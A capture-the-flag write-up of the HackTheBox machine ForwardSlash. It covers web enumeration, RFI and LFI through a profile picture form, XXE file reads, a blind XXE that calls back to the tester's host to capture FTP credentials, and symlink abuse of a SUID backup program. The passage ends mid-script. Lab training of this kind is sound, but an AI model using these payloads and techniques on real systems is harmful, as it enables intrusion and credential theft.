---
title: HTB: ForwardSlash
url: https://0xdf.gitlab.io/2020/07/04/htb-forwardslash.html
date: 2020-07-04T14:45:00+00:00
difficulty: Hard [40]
os: Linux
tags: htb-forwardslash, ctf, hackthebox, ubuntu, nmap, php, vhosts, wfuzz, gobuster, burp, burp-repeater, rfi, lfi, xxe, credentials, ssh, sudo, suid, python, luks, crypto
---

![ForwardSlash](https://0xdfimages.gitlab.io/img/forwardslash-cover.png)

ForwardSlash starts with enumeration of a hacked website to identify and exploit at least one of two LFI vulnerabilities (directly using filters to base64 encode or using XXE) to leak PHP source which includes a password which can be used to get a shell. From there, I’ll exploit a severely non-functional “backup” program to get file read as the other user. With this, I’ll find a backup of the website, and find different credentials in one of the pages, which I can use for a shell as the second user. To root, I’ll break a homespun encryption algorithm to load an encrypted disk image which contains root’s private SSH key. In Beyond Root, I’ll dig into the website source to understand a couple surprising things I found while enumerating.

## Box Info

| Name | [ForwardSlash](https://hackthebox.com/machines/forwardslash)  [ForwardSlash](https://hackthebox.com/machines/forwardslash) [Play on HackTheBox](https://hackthebox.com/machines/forwardslash) |
| --- | --- |
| Release Date | [04 Apr 2020](https://twitter.com/hackthebox_eu/status/1245712528421933059) |
| Retire Date | 04 Jul 2020 |
| OS | Linux Linux |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for ForwardSlash |
| Radar Graph | Radar chart for ForwardSlash |
| First Blood User | 00:50:51[snowscan snowscan](https://app.hackthebox.com/users/9267) |
| First Blood Root | 01:43:41[qtc qtc](https://app.hackthebox.com/users/103578) |
| Creators | [InfoSecJack InfoSecJack](https://app.hackthebox.com/users/52045)  [chivato chivato](https://app.hackthebox.com/users/44614) |

## Recon

### nmap

`nmap` shows two open TCP ports, SSH (22) and HTTP (80):

```

root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.183
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-04 14:51 EDT
Nmap scan report for 10.10.10.183
Host is up (0.018s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 8.68 seconds
root@kali# nmap -p 22,80 -sV -sC -oA scans/nmap-tcpscripts 10.10.10.183
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-04 14:52 EDT
Nmap scan report for 10.10.10.183
Host is up (0.012s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 3c:3b:eb:54:96:81:1d:da:d7:96:c7:0f:b4:7e:e1:cf (RSA)
|   256 f6:b3:5f:a2:59:e3:1e:57:35:36:c3:fe:5e:3d:1f:66 (ECDSA)
|_  256 1b:de:b8:07:35:e8:18:2c:19:d8:cc:dd:77:9c:f2:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Did not follow redirect to http://forwardslash.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.50 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, this machine is likely Ubuntu Bionic 18.04.

### Virtual Hosts

The `nmap` script on port 80 shows that the page returns a redirect to `http://forwardslash.htb`. Because hostnames are involved, I’ll run a scan for virtual hosts with `wfuzz`. Like always with `wfuzz`, I start running it without hiding anything, see a sample of what looks like the default case, and then add in a flag to hide that case (I often don’t show that process in writeups), but this time there’s potential to trip up. The initial run looks like this (I’ll hit Ctrl-c right after it starts):

```

root@kali# wfuzz -c -u 10.10.10.183 -H "Host: FUZZ.forwardslash.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.183/
Total requests: 100000

===================================================================                                                                                                               
ID           Response   Lines    Word     Chars       Payload                                                                                                           
===================================================================

000000005:   302        0 L      0 W      0 Ch        "webmail"
000000008:   302        0 L      0 W      0 Ch        "ns2"
000000001:   302        0 L      0 W      0 Ch        "www"
000000002:   302        0 L      0 W      0 Ch        "mail"
000000003:   302        0 L      0 W      0 Ch        "remote"
000000004:   302        0 L      0 W      0 Ch        "blog"
^C

```

When selecting what to hide, it’s best to pick the most specific thing that is consistent, which here is characters. If I hide based on the HTTP response code or lines in this case, I’d miss the finding:

```

root@kali# wfuzz -c -u 10.10.10.183 -H "Host: FUZZ.forwardslash.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --hh 0
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.183/
Total requests: 100000

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                                          
===================================================================

000000153:   302        0 L      6 W      33 Ch       "backup"
000037212:   400        12 L     53 W     422 Ch      "*"

Total time: 195.5404
Processed Requests: 100000
Filtered Requests: 99998
Requests/sec.: 511.4031

```

I’ll update my `/etc/hosts` file with both `forwardslash.htb` and `backup.forwardslash.htb` pointing to 10.10.10.183:

```
10.10.10.183 forwardslash.htb backup.forwardslash.htb

```

I typically use `wfuzz` out of both habit and because I like seeing what’s actually changing here. But the vhost mode in the latest `gobuster` will also find this (where forwardslash.htb is already in `/etc/hosts`):

```

root@kali# gobuster vhost -u http://forwardslash.htb -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:          http://forwardslash.htb
[+] Threads:      10
[+] Wordlist:     /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
[+] User Agent:   gobuster/3.0.1
[+] Timeout:      10s
===============================================================
2020/04/05 06:15:56 Starting gobuster
===============================================================
Found: backup.forwardslash.htb (Status: 302) [Size: 33]
Found: *.forwardslash.htb (Status: 400) [Size: 422]
===============================================================
2020/04/05 06:17:17 Finished
===============================================================

```

### forwardslash.htb - TCP 80

#### Site

Visiting `http://10.10.10.183` just returns a redirect to `http://forwardslash.htb`.

Visiting with the domain name returns a defaced site:

![image-20200405062027408](https://0xdfimages.gitlab.io/img/image-20200405062027408.png)

There’s an important hint here for the intended path:

> | You call this security? **LOL**, absolute trash server… |   
> #Defaced • This was ridiculous, who even uses **XML** and **Automatic FTP Logins**

I’ll keep this in mind.

#### Directory Brute Force

I checked and `/` is the same as `index.php`, which indicates this is a PHP site, so I’ll add `-x php` to the `gobuster` args:

```

root@kali# gobuster dir -u http://forwardslash.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 40 -o scans/gobuster-root-medium-php
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://forwardslash.htb
[+] Threads:        40
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2020/04/04 14:59:41 Starting gobuster
===============================================================
/index.php (Status: 200)
/server-status (Status: 403)
===============================================================
2020/04/04 15:02:51 Finished
===============================================================

```

Nothing interesting.

### backup.forwardslash.htb - TCP 80

#### Site

The root redirects to `/login.php`:

![image-20200405062249297](https://0xdfimages.gitlab.io/img/image-20200405062249297.png)

The “Sign up now” link presents a form where I can create a login, and then come back here and log in. Doing so gives a dashboard, `welcome.php`:

![image-20200405062340916](https://0xdfimages.gitlab.io/img/image-20200405062340916.png)

Here’s what each does:

| Button | Page | Description |
| --- | --- | --- |
| Reset Your Password | `reset-password.php` | Form to enter new password and confirm password. POSTing to it seems to log me out, but not change my password. |
| Sign Out of Your Account | `logout.php` | Ends current session, redirects to Login form. |
| Change Your Username | `updusername.php` | Form to enter new username. Anything submitted just reload the same form, without changing the username. |
| Change Your Profile Picture | `profilepicture.php` | See Below |
| Quick Message | `environment.php` | A static message about cigarette littering. |
| Hall of Fame | `hof.php` | A static message thanking people in the HTB community. |

#### Directory Brute Force

I started `gobuster` to have enumeration going in the background while I played with the site:

```

root@kali# gobuster dir -u http://backup.forwardslash.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 40 -o s
cans/gobuster-backup-root-medium-php
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://backup.forwardslash.htb
[+] Threads:        40
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2020/04/04 15:07:42 Starting gobuster
===============================================================
/register.php (Status: 200)
/welcome.php (Status: 302)
/dev (Status: 301)
/api.php (Status: 200)
/environment.php (Status: 302)
/index.php (Status: 302)
/login.php (Status: 200)
/logout.php (Status: 302)
/config.php (Status: 200)
/hof.php (Status: 302)
/server-status (Status: 403)
===============================================================
2020/04/04 15:10:44 Finished
===============================================================

```

`/dev` is interesting and I’ll want to check that out. The rest are already explained from looking through the site.

#### Profile Picture

`profilepicture.php` shows a single text field labeled “URL”. Both the field and the Submit buttons are disabled via HTML, and there’s a note suggesting that is due to the hack:

![image-20200405063222638](https://0xdfimages.gitlab.io/img/image-20200405063222638.png)

Disabling buttons in HTML is not a security measure. I’ll want to come poke at this.

#### /dev

Visiting `http://backup.forwardslash.htb/dev/` returns a 403:

![image-20200405152122503](https://0xdfimages.gitlab.io/img/image-20200405152122503.png)

That message suggests I’m blocked because of my IP. I should try to visit from localhost later.

## Shell as chiv

### RFI in Profile Picture

#### RFI Proof of Concept

I can easily re-enable the fields in `profilepicture.php` so that I can submit by right clicking on each and selecting Inspect Element, and then removing `disabled=""` from the HTML. I’ll then start a Python web server, add my myself as a url, `http://10.10.14.24/` and hit submit. It send a request to me:

```

root@kali# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.183 - - [04/Apr/2020 15:27:51] "GET / HTTP/1.0" 200 -

```

Not only does it show up at my server, but the response shows up in the page:

![image-20200405063652163](https://0xdfimages.gitlab.io/img/image-20200405063652163.png)

I’ll create a text file with just “0xdf” in it. When I reference that file with the input url, it too is included on the page:

![image-20200405064413394](https://0xdfimages.gitlab.io/img/image-20200405064413394.png)

This is a remote file include vulnerability.

#### PHP

My initial thought was to include a PHP webshell. I’ll drop one into my webserver directory, and submit it to the form. When I look at the source of the page that comes back, it is showing the webshell at the bottom:

```

<!DOCTYPE html>
<head>
    <meta charset="UTF-8">
    <title>Welcome</title>
    <link rel="stylesheet" href="bootstrap.css">
    <style type="text/css">
        body{ font: 14px sans-serif; text-align: center; }
    </style>
</head>
<body>
    <div class="page-header">
        <h1>Change your Profile Picture!</h1>
	<font style="color:red">This has all been disabled while we try to get back on our feet after the hack.<br><b>-Pain</b></font>
    </div>
<form action="/profilepicture.php" method="post">
        URL:
        <input type="text" name="url" disabled style="width:600px"><br>
        <input style="width:200px" type="submit" value="Submit" disabled>
</form>
</body>
</html>
<?php system($_REQUEST["cmd"]); ?>

```

That means that the data included isn’t executed as PHP. Instead of something like `require()` or `include()`, it must be using something like `file_get_contents()`. Sending a webshell via RFI won’t provide code execution.

#### /dev

Grabbing `http://backup.forwardslash.htb/dev/` as a profile picture loads the API test console:

![image-20200405152338261](https://0xdfimages.gitlab.io/img/image-20200405152338261.png)

Hitting the submit button returns the 403 because the request is coming from my host, so the IP block kicks in. Turned out this is the intended path, so I’ll come back to this at the end of this section.

#### RFI Enumeration

I did a bit more poking around to see if there was anything different when queried from localhost. For example, I can access `http://127.0.0.1/server-status/`:

![image-20200405064617700](https://0xdfimages.gitlab.io/img/image-20200405064617700.png)

There is some information leakage, but nothing I found this way seemed too valuable.

### LFI in Profile Picture

The good news about the include not processing as PHP is that if I can reference local files, I can leak source for the site. I’ll test to see if a local file is included when given a file path instead of a url. I’ll also move over to Burp Repeater here so I don’t have to keep enabling the form elements. The LFI works:

[![Burp Repeater LFI](https://0xdfimages.gitlab.io/img/image-20200405064757206.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200405064757206.png)

### LFI Enumeration

Next I wanted to see what files I could access with this LFI. I looked for things like ssh keys and `user.txt` without luck. Then I turned to the source for the various pages. I could read the source for the default vhost at `/var/www/html/index.php`.

Next I tried to guess the path to the backup vhost. I looked at the Apache `sites-enabled` folder to see if that would tell me, but `000-default.conf` only addresses the default case.

After a bit of guessing, when I sent `var/www/backup.forwardslash.htb/index.php`, I got a response:

[![Burp Repeater](https://0xdfimages.gitlab.io/img/image-20200405152859488.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200405152859488.png)

That’s a strange message (I’ll look at it in [Beyond Root](#apiphp)). What about a filter? When I submit `url=php://filter/convert.base64-encode/resource=/var/www/backup.forwardslash.htb/index.php`, I get a blob of base64:

[![Burp Repeater got source code](https://0xdfimages.gitlab.io/img/image-20200405153217702.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200405153217702.png)

I can use this to read the rest of the site source. The only page with anything relatively interesting at the root was `config.php`, which had some creds:

```

<?php
//credentials for the temp db while we recover, had to backup old config, didn't want it getting compromised -pain
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'www-data');
define('DB_PASSWORD', '5iIwJX0C2nZiIhkLYE7n314VcKNx8uMkxfLvCTz2USGY180ocz3FQuVtdCy3dAgIMK3Y8XFZv9fBi6OwG6OYxoAVnhaQkm7r2ec');
define('DB_NAME', 'site');
 
/* Attempt to connect to MySQL database */
$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
 
// Check connection
if($link === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
}
?>

```

I couldn’t find anywhere that these were useful.

Moving to `/dev`, I grabbed the source for `index.php`. Right in the middle of the page are creds for FTP login as chiv:

```

if (@ftp_login($conn_id, "chiv", 'N0bodyL1kesBack/')) {
    error_log("Getting file");
    echo ftp_get_string($conn_id, "debug.txt");
}

```

### SSH

Those creds work for SSH access as chiv:

```

root@kali# ssh chiv@10.10.10.183
chiv@10.10.10.183's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Apr  5 19:37:48 UTC 2020

  System load:  0.0                Processes:            189
  Usage of /:   32.7% of 19.56GB   Users logged in:      1
  Memory usage: 23%                IP address for ens33: 10.10.10.183
  Swap usage:   0%
 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

16 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sun Apr  5 18:31:48 2020 from 10.10.14.24
chiv@forwardslash:~$ id
uid=1001(chiv) gid=1001(chiv) groups=1001(chiv)

```

### Alternative LFI via XXE

I bypassed whatever code was preventing the PHP leak and used the LFI above, but had that not worked, there was another unintended way to leak the page source using XXE.

Back at the login page, I tried to login as admin/admin, and it told me there was no account with that name:

![image-20200406124226749](https://0xdfimages.gitlab.io/img/image-20200406124226749.png)

If I create it, and log in, then when I go to `/dev`, it doesn’t return 403 like above, but rather loads:

![image-20200406124451487](https://0xdfimages.gitlab.io/img/image-20200406124451487.png)

So it seems it’s not just an IP block, but also looking at username. I’ll look at this in [Beyond Root](#ip--username-blocking).

And now I can submit the form:

![image-20200406124509668](https://0xdfimages.gitlab.io/img/image-20200406124509668.png)

This form is vulnerable to XXE file reads. For example, to get `/etc/passwd`, I can submit a payload like this:

```

<!DOCTYPE api [
  <!ELEMENT api ANY>
  <!ENTITY df SYSTEM "file:///etc/passwd">
]>
<api>
    <request>&df;</request>
</api>

```

![image-20200406124659228](https://0xdfimages.gitlab.io/img/image-20200406124659228.png)

I can try to get PHP source, but it doesn’t show up in the output. Luckily, I can use PHP filters in XXE just like in PHP. So this payload:

```

<!DOCTYPE api [
  <!ELEMENT api ANY>
  <!ENTITY df SYSTEM "php://filter/convert.base64-encode/resource=/var/www/backup.forwardslash.htb/dev/index.php">
]>
<api>
    <request>&df;</request>
</api>

```

Returns:

![image-20200406124847799](https://0xdfimages.gitlab.io/img/image-20200406124847799.png)

Which can be decoded just like the other LFI.

### Intended Path - Creds via FTP

I only learned of the intended path after talking to some friends much later after solving the box. Logged in as a non-admin user, I was able to use profile picture change form to access `/dev` from localhost. When I get that, the source for `/dev/index.php` shows up, and there’s a hint in a comment in at the bottom:

[![](https://0xdfimages.gitlab.io/img/image-20200703222553814.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200703222553814.png)

There’s another reference to FTP:

> TODO: Fix FTP Login

Interestingly, the source shows that this form submits a GET request:

```

<form action="/dev/index.php" method="get" id="xmltest">

```

I wasn’t able to get the page to display back to me `/etc/passwd` the way I could when I could access the page as admin. But I didn’t spent too much time on it, rather focusing on FTP. I had to try a few payloads from the [payloadsallthethings XXE page](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection) but one of the blind payloads worked. I started with this:

```

<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://UNIQUE_ID_FOR_BURP_COLLABORATOR.burpcollaborator.net/x"> %ext;
]>
<r></r>

```

I first tried it as HTTP, updated it to connect back to me:

```

<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://10.10.14.24/x"> %ext;
]>
<r></r>

```

I started `nc` on 80, and sent the payload with Burp Repeater:

```

POST /profilepicture.php HTTP/1.1
Host: backup.forwardslash.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://backup.forwardslash.htb/profilepicture.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 583
Connection: close
Cookie: PHPSESSID=q0gqh5u3ak0hltppu9jq91iu0a
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache

url=http://backup.forwardslash.htb/dev/index.php?xml=%253c%253f%2578%256d%256c%2520%2576%2565%2572%2573%2569%256f%256e%253d%2522%2531%252e%2530%2522%2520%253f%253e%250d%250a%253c%2521%2544%254f%2543%2554%2559%2550%2545%2520%2572%256f%256f%2574%2520%255b%250d%250a%253c%2521%2545%254e%2554%2549%2554%2559%2520%2525%2520%2565%2578%2574%2520%2553%2559%2553%2554%2545%254d%2520%2522%2568%2574%2574%2570%253a%252f%252f%2531%2530%252e%2531%2530%252e%2531%2534%252e%2533%2534%252f%2578%2522%253e%2520%2525%2565%2578%2574%253b%250d%250a%255d%253e%250d%250a%253c%2572%253e%253c%252f%2572%253e

```

I got a connection at `nc`:

```

root@kali# nc -lnvp 80
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 10.10.10.183.
Ncat: Connection from 10.10.10.183:47328.
GET /x HTTP/1.0
Host: 10.10.14.24
Connection: close

```

To make that payload work, I double url-encoded it. When it reached `profilepicture.php`, it will decode the payload. If I only encoded once, the resulting payload wouldn’t be a valid url, with spaces and `?` character. But in double encoded, that resulting payload is still encoded.

I updated the payload to try FTP:

```

<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "ftp://10.10.14.24/"> %ext;
]>
<r></r>

```

I send it:

```

POST /profilepicture.php HTTP/1.1
Host: backup.forwardslash.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://backup.forwardslash.htb/profilepicture.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 573
Connection: close
Cookie: PHPSESSID=q0gqh5u3ak0hltppu9jq91iu0a
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache

url=http://backup.forwardslash.htb/dev/index.php?xml=%253c%253f%2578%256d%256c%2520%2576%2565%2572%2573%2569%256f%256e%253d%2522%2531%252e%2530%2522%2520%253f%253e%250d%250a%253c%2521%2544%254f%2543%2554%2559%2550%2545%2520%2572%256f%256f%2574%2520%255b%250d%250a%253c%2521%2545%254e%2554%2549%2554%2559%2520%2525%2520%2565%2578%2574%2520%2553%2559%2553%2554%2545%254d%2520%2522%2566%2574%2570%253a%252f%252f%2531%2530%252e%2531%2530%252e%2531%2534%252e%2533%2534%252f%2522%253e%2520%2525%2565%2578%2574%253b%250d%250a%255d%253e%250d%250a%253c%2572%253e%253c%252f%2572%253e

```

And I get a connection at `nc`:

```

root@kali# nc -lnvp 21
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::21
Ncat: Listening on 0.0.0.0:21
Ncat: Connection from 10.10.10.183.
Ncat: Connection from 10.10.10.183:37392.

```

I could send back the strings that an FTP server would send, or I can just run `responder`. I’ll start it and send again in Repeater, and it captures the username and password:

```

root@kali# responder -I tun0 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.0.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.24]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Listening for events...
[FTP] Cleartext Client   : 10.10.10.183
[FTP] Cleartext Username : chiv
[FTP] Cleartext Password : N0bodyL1kesBack/

```

## Priv: chiv –> pain

### Enumeration

I ran [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) and one thing I noticed was a SUID binary that was unusual, `/usr/bin/backup`:

```

chiv@forwardslash:~$ ls -l /usr/bin/backup 
-r-sr-xr-x 1 pain pain 13384 Mar  6 10:06 /usr/bin/backup

```

Given that this is owned by pain, I also looked for files owned by pain:

```

chiv@forwardslash:~$ find / -user pain -type f 2>/dev/null
/var/backups/config.php.bak
/usr/bin/backup
/home/pain/.profile
/home/pain/user.txt
/home/pain/.bashrc
/home/pain/.bash_logout
/home/pain/encryptorinator/encrypter.py
/home/pain/encryptorinator/ciphertext
/home/pain/note.txt

```

### backup

#### Run It

Running the program, it prints a splash text, then the time, then an error:

```

chiv@forwardslash:~$ backup
----------------------------------------------------------------------
        Pain's Next-Gen Time Based Backup Viewer
        v0.1
        NOTE: not reading the right file yet,
        only works if backup is taken in same second
----------------------------------------------------------------------

Current Time: 18:57:14
ERROR: ca456489b9e7e0963a71cd412bc160e2 Does Not Exist or Is Not Accessible By Me, Exiting...

```

`ca456489b9e7e0963a71cd412bc160e2` is 32 hex characters, so it looks like an MD5 hash. Beyond that, it changes each time I run `backup`.

Given the time stamp, as well as the note that it is not reading the right file, and it only works if it is taken in the same second, I take a guess that the hash is the MD5 of the current time. It proves correct, as I can recreate the hash:

```

chiv@forwardslash:~$ echo -n 18:57:14 | md5sum
ca456489b9e7e0963a71cd412bc160e2  -

```

#### Successful Read

I want some Bash code that will create the filename for the current second for me, which leads to:

```

date | cut -d' ' -f4 | tr -d $'\n' | md5sum | cut -d' ' -f1

```

`date` will output something like “Tue Jun 30 14:58:32 UTC 2020”. That `cut` command will get the fifth column space delimited, which is “18:58:00”. The `tr` will delete (`-d`) the trailing newline (as that is not part of the hash). Finally, another cut to isolate just the MD5, and not the file name (in this case `-` for STDIN).

That allows me to do something like this, where I put some text into a file named as the hash of the current time and then immediately call `backup`:

```

chiv@forwardslash:~$ echo 0xdf > $(date | cut -d' ' -f4 | tr -d $'\n' | md5sum | cut -d' ' -f1); backup
----------------------------------------------------------------------
        Pain's Next-Gen Time Based Backup Viewer
        v0.1
        NOTE: not reading the right file yet, 
        only works if backup is taken in same second
----------------------------------------------------------------------

Current Time: 09:30:17
0xdf

```

`backup` prints the contents of that file where the error message had been. It also seems to delete the backup file.

Now I want to read files that already exist. I can do this with symbolic links, pointing to the file I want to read, and named the MD5 of the current timestamp:

```

chiv@forwardslash:~$ ln -s /etc/lsb-release $(date | cut -d' ' -f4 | tr -d $'\n' | md5sum | cut -d' ' -f1); backup
----------------------------------------------------------------------
        Pain's Next-Gen Time Based Backup Viewer
        v0.1
        NOTE: not reading the right file yet, 
        only works if backup is taken in same second
----------------------------------------------------------------------

Current Time: 09:32:40
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=18.04
DISTRIB_CODENAME=bionic
DISTRIB_DESCRIPTION="Ubuntu 18.04.4 LTS"

```

I can also read a file I couldn’t read before, `user.txt`:

```

chiv@forwardslash:~$ ln -s /home/pain/user.txt $(date | cut -d' ' -f4 | tr -d $'\n' | md5sum | cut -d' ' -f1); backup
----------------------------------------------------------------------
        Pain's Next-Gen Time Based Backup Viewer
        v0.1
        NOTE: not reading the right file yet, 
        only works if backup is taken in same second
----------------------------------------------------------------------

Current Time: 09:34:47
db0e0420************************

```

### Reading as pain

Checking out the other files owned by pain that chiv can’t read, `/var/backups/config.php.bak` had interesting data:

```

chiv@forwardslash:~$ ln -s /var/backups/config.php.bak $(date | cut -d' ' -f4 | tr -d $'\n' | md5sum | cut -d' ' -f1); backup
----------------------------------------------------------------------
        Pain's Next-Gen Time Based Backup Viewer
        v0.1
        NOTE: not reading the right file yet, 
        only works if backup is taken in same second
----------------------------------------------------------------------

Current Time: 09:35:53
<?php
/* Database credentials. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'pain');
define('DB_PASSWORD', 'db1f73a72678e857d91e71d2963a1afa9efbabb32164cc1d94dbc704');
define('DB_NAME', 'site');
 
/* Attempt to connect to MySQL database */
$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
 
// Check connection
if($link === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
}
?>

```

It looks like `config.php` from the web directory, only the username is pain, and the password is different.

### su / SSH

The password works for both `su` from a chiv shell or direct SSH access as pain:

```

chiv@forwardslash:~$ su - pain
Password: 
pain@forwardslash:~$

```

I can grab `user.txt` now if I hadn’t before.

## Priv: pain –> root

### Enumeration

There are a couple pieces I need to find here. The first bit is obvious, sitting right in pain’s home directory:

```

pain@forwardslash:~$ ls
encryptorinator  note.txt  user.txt

pain@forwardslash:~$ cat note.txt 
Pain, even though they got into our server, I made sure to encrypt any important files and then did some crypto magic on the key... I gave you the key in person the other day, so unless these hackers are some crypto experts we should be good to go.
-chiv

```

There are also three commands that pain can run as root without a password:

```

pain@forwardslash:/$ sudo -l
Matching Defaults entries for pain on forwardslash:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pain may run the following commands on forwardslash:
    (root) NOPASSWD: /sbin/cryptsetup luksOpen *
    (root) NOPASSWD: /bin/mount /dev/mapper/backup ./mnt/
    (root) NOPASSWD: /bin/umount ./mnt/

```

Inside the `encryptorinator` directory, there’s an encrypted key and a Python script:

```

pain@forwardslash:~$ file encryptorinator/*
encryptorinator/ciphertext:   data
encryptorinator/encrypter.py: Python script, ASCII text executable

```

I will also need a LUKS partition to decrypt once I find the password. Just exploring the file system, I find it at `var/backups/recovery/encrypted_backup.img`:

```

pain@forwardslash:/var/backups/recovery$ file encrypted_backup.img 
encrypted_backup.img: LUKS encrypted file, ver 1 [aes, xts-plain64, sha256] UUID: f2a0906a-c412-48db-8c18-3b72443c1bdf

```

With all of that, it seems clear that I need to break the encryption on `ciphertext`, and use the result to decrypt and mount the Luks volume at `/var/backups/recovery/encrypted_backup.img`.

### encrypter.py

The Python script has `encrypt` and `decrypt` functions, each of which take two strings.

```

def encrypt(key, msg):
    key = list(key)
    msg = list(msg)
    for char_key in key:
        for i in range(len(msg)):
            if i == 0:
                tmp = ord(msg[i]) + ord(char_key) + ord(msg[-1])
            else:
                tmp = ord(msg[i]) + ord(char_key) + ord(msg[i-1])

            while tmp > 255:
                tmp -= 256
            msg[i] = chr(tmp)
    return ''.join(msg)

def decrypt(key, msg):
    key = list(key)
    msg = list(msg)
    for char_key in reversed(key):
